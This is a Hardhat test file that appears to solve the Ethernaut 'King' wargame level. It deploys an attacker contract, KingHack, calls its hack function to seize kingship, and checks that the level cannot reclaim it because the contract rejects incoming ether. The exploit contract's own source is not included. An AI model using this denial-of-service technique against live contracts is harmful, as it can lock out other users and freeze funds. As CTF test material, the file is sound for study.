import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

const INSERT_COIN = ethers.utils.parseEther("0.001");

describe("", () => {
  async function deployKingFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const KingFactory = await ethers.getContractFactory("KingFactory");
    const kingFactory = await KingFactory.connect(deployer).deploy();

    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
    const kingAddress = await kingFactory
      .connect(deployer)
      .callStatic.createInstance(attacker.address, { value: INSERT_COIN });

    const tx = await kingFactory.connect(deployer).createInstance(attacker.address, { value: INSERT_COIN });
    await tx.wait();

    // Load the instance at returned address
    const king = await ethers.getContractAt("King", kingAddress);

    const KingHack = await ethers.getContractFactory("KingHack");
    const kingHack = await KingHack.connect(deployer).deploy();
    return { attacker, kingFactory, king, kingHack };
  }

  it("Stop level from claiming kingship", async () => {
    const { attacker, kingFactory, king, kingHack } = await loadFixture(deployKingFixture);

    // Perform hack. This causes the KingHack contract to assume kingship of the King contract.
    let tx = await kingHack.hack(king.address, { value: INSERT_COIN });
    await tx.wait();

    const kingBeforeSubmit = await king._king();

    // Simulate submit instance to get success value.
    const success = await kingFactory.connect(attacker).callStatic.validateInstance(king.address, attacker.address);
    expect(success).to.be.true;

    // Submit the instance
    // Since the KingHack contract does not have receive or payable fallback functions, level cannot reclaim kingship.
    tx = await kingFactory.validateInstance(king.address, attacker.address);
    await tx.wait();

    const kingAfterSubmit = await king._king();

    expect(kingBeforeSubmit).to.equal(kingAfterSubmit, "Attack Failed!!!");
  });
});
